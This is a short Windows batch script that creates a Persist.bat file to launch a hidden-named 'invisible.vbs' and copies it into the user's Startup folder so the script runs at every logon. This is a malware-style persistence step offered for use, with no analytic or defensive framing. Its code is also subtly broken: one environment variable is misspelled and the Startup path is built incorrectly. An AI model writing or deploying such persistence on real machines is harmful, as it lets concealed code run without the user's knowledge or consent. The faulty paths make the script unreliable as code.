@echo off 
cd %USERPROFILE%\Downloads
(
echo start "%USEPROFILE%\Pictures\invisible.vbs"
)>Persist.bat
copy "%USERPROFILE%\Downloads\Persist.bat" "C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
pause;
